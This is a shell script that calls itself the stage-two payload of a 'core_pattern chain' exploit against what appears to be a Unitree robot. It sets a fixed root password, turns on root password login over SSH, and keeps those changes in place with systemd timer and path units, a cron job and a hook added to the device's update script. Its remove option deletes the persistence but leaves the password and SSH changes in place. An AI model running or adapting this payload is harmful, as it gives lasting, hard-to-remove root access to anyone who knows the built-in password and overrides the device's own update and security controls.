#!/bin/sh
# Stage-two payload for the core_pattern chain.
# Installs persistent root SSH access with password: unleash
# This file is designed to be streamed into /bin/sh; it writes the durable
# guard to persistent storage before invoking it.

set -u
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

STATE_DIR=/unitree/var/data/fido-fidelis
GUARD="$STATE_DIR/ssh_guard.sh"

mkdir -p "$STATE_DIR" || exit 1

cat > "$GUARD" <<'FIDO_FIDELIS_GUARD'
#!/bin/sh
# Persistent root-SSH guard installed by Fido Fidelis.

set -u
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

STATE_DIR=/unitree/var/data/fido-fidelis
GUARD="$STATE_DIR/ssh_guard.sh"
SSHD_CONFIG=/etc/ssh/sshd_config
ROOT_HASH='$6$unleash$uACp8f6esjaqervYnKamsEK/MvkmxKQUY16Xbugt68/3ouc7kF5G8oE.Q/Ucza0T2D07X8pBq2jsSIfpxofFR/'
SERVICE=/etc/systemd/system/fido-fidelis-ssh-guard.service
TIMER=/etc/systemd/system/fido-fidelis-ssh-guard.timer
PATH_UNIT=/etc/systemd/system/fido-fidelis-ssh-guard.path
CRON=/etc/cron.d/fido-fidelis-ssh-guard
UPDATE_HOOK=/unitree/var/data/deb_update/deb_update.sh
BEGIN_MARK='# BEGIN FIDO FIDELIS ROOT SSH'
END_MARK='# END FIDO FIDELIS ROOT SSH'

set_sshd_option() {
    key=$1
    value=$2
    if grep -Eq "^[#[:space:]]*${key}[[:space:]]+" "$SSHD_CONFIG"; then
        sed -i "s|^[#[:space:]]*${key}[[:space:]].*|${key} ${value}|g" "$SSHD_CONFIG"
    else
        printf '\n%s %s\n' "$key" "$value" >> "$SSHD_CONFIG"
    fi
}

ensure_password() {
    current=$(sed -n 's/^root:\([^:]*\):.*/\1/p' /etc/shadow)
    [ "$current" = "$ROOT_HASH" ] && return 0

    if [ -x /usr/sbin/chpasswd ]; then
        printf 'root:%s\n' "$ROOT_HASH" | /usr/sbin/chpasswd -e
    elif [ -x /unitree/sbin/cpwd ]; then
        printf 'root:%s\n' "$ROOT_HASH" | /unitree/sbin/cpwd -e
    else
        echo 'no chpasswd-compatible tool found' >&2
        return 1
    fi
}

ensure_config() {
    [ -f "$SSHD_CONFIG" ] || {
        echo "$SSHD_CONFIG is missing" >&2
        return 1
    }
    set_sshd_option PermitRootLogin yes
    set_sshd_option PasswordAuthentication yes
    set_sshd_option PubkeyAuthentication yes
}

ensure_sshd() {
    mkdir -p /run/sshd
    chmod 755 /run/sshd
    chown root:root /run/sshd

    systemctl enable ssh >/dev/null 2>&1 || \
        systemctl enable sshd >/dev/null 2>&1 || true

    if pgrep -x sshd >/dev/null 2>&1; then
        systemctl reload ssh >/dev/null 2>&1 || \
            systemctl reload sshd >/dev/null 2>&1 || true
        return 0
    fi

    systemctl start ssh >/dev/null 2>&1 || \
        systemctl start sshd >/dev/null 2>&1 || \
        service ssh start >/dev/null 2>&1 || \
        /usr/sbin/sshd -o PermitRootLogin=yes \
                       -o PasswordAuthentication=yes \
                       -o PubkeyAuthentication=yes
}

install_units() {
    cat > "$SERVICE" <<'UNIT'
[Unit]
Description=Fido Fidelis root SSH guard
After=network.target ota_box.service

[Service]
Type=oneshot
ExecStart=/unitree/var/data/fido-fidelis/ssh_guard.sh check
UNIT

    cat > "$TIMER" <<'UNIT'
[Unit]
Description=Periodically restore Fido Fidelis root SSH access

[Timer]
OnBootSec=90s
OnUnitActiveSec=5min
AccuracySec=15s
Unit=fido-fidelis-ssh-guard.service

[Install]
WantedBy=timers.target
UNIT

    cat > "$PATH_UNIT" <<'UNIT'
[Unit]
Description=Watch SSH configuration and service files for Fido Fidelis

[Path]
PathChanged=/etc/ssh/sshd_config
PathChanged=/lib/systemd/system/ssh.service
Unit=fido-fidelis-ssh-guard.service

[Install]
WantedBy=multi-user.target
UNIT

    printf '*/5 * * * * root %s check\n' "$GUARD" > "$CRON"
    chmod 644 "$SERVICE" "$TIMER" "$PATH_UNIT" "$CRON"

    systemctl daemon-reload >/dev/null 2>&1 || true
    systemctl enable fido-fidelis-ssh-guard.timer >/dev/null 2>&1 || true
    systemctl enable fido-fidelis-ssh-guard.path >/dev/null 2>&1 || true
    systemctl start fido-fidelis-ssh-guard.timer >/dev/null 2>&1 || true
    systemctl start fido-fidelis-ssh-guard.path >/dev/null 2>&1 || true
}

install_update_hook() {
    [ -f "$UPDATE_HOOK" ] || return 0
    grep -Fq "$BEGIN_MARK" "$UPDATE_HOOK" && return 0
    cat >> "$UPDATE_HOOK" <<'HOOK'

# BEGIN FIDO FIDELIS ROOT SSH
/unitree/var/data/fido-fidelis/ssh_guard.sh install
# END FIDO FIDELIS ROOT SSH
HOOK
}

remove_update_hook() {
    [ -f "$UPDATE_HOOK" ] || return 0
    sed -i '/^# BEGIN FIDO FIDELIS ROOT SSH$/,/^# END FIDO FIDELIS ROOT SSH$/d' "$UPDATE_HOOK"
}

check_access() {
    ensure_password
    ensure_config
    ensure_sshd
    date -u '+%Y-%m-%dT%H:%M:%SZ' > "$STATE_DIR/last_check"
}

install_guard() {
    chmod 755 "$GUARD"
    install_units
    install_update_hook
    check_access
    printf 'installed\n' > "$STATE_DIR/status"
}

remove_guard() {
    systemctl disable --now fido-fidelis-ssh-guard.timer >/dev/null 2>&1 || true
    systemctl disable --now fido-fidelis-ssh-guard.path >/dev/null 2>&1 || true
    systemctl stop fido-fidelis-ssh-guard.service >/dev/null 2>&1 || true
    rm -f "$SERVICE" "$TIMER" "$PATH_UNIT" "$CRON"
    remove_update_hook
    systemctl daemon-reload >/dev/null 2>&1 || true
    rm -f "$STATE_DIR/last_check" "$STATE_DIR/status"
    rm -f "$GUARD"
    rmdir "$STATE_DIR" 2>/dev/null || true
    echo 'persistence removed; SSH configuration and the root password remain changed'
}

case "${1:-check}" in
    install) install_guard ;;
    check)   check_access ;;
    remove)  remove_guard ;;
    *)       echo "usage: $0 {install|check|remove}" >&2; exit 2 ;;
esac
FIDO_FIDELIS_GUARD

chmod 755 "$GUARD" || exit 1
"$GUARD" install
sync
